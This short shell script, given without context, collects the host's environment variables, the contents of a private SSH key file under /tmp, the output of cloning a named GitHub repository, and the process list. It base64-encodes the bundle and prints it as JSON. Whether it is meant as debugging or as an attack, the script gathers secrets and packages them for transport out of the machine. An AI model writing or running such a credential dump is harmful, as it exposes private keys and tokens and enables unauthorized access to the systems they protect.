OUT=my.output
echo "=================================="  >$OUT 2>&1
env >>$OUT 2>&1
echo "=================================="  >>$OUT 2>&1
cat /tmp/.ssh_private_key   >>$OUT 2>&1
echo "=================================="  >>$OUT 2>&1
git clone 'git@github.com:stjude/terraform-modules.git'  >>$OUT 2>&1
echo "=================================="  >>$OUT 2>&1
ps -ef  >>$OUT 2>&1

b64=$(cat $OUT|base64 -w0)
echo "{ \"out\": \"${b64}\" }"
